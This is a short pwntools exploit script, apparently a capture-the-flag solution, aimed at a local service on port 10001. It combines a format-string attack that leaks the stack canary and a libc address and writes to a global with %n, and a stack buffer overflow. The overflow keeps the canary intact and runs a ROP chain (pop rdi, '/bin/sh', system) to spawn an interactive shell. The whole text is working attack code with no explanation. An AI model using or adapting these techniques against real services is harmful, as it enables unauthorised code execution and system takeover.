from pwn import *


p=remote("localhost",10001)

p.sendline("10")


p.send(b"%11$p %15$p %100cbbb%9$n"+p64(0x4040ac)[:-1])

p.recvuntil("learned to get here !\n")

leaks=p.recvline()[:-1].split()[:2]

libc_leak=int(leaks[1],16)
canary=int(leaks[0],16)

libc_base=libc_leak-0x27c8a

system=libc_base+0x000000000004dab0
binsh=libc_base+0x197e34
pop_rdi=0x0000000000028215+libc_base # you can also use ropper on the libc file xD
ret=0x000000000040152e

p.sendline(b"a"*0x28+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system))


p.interactive()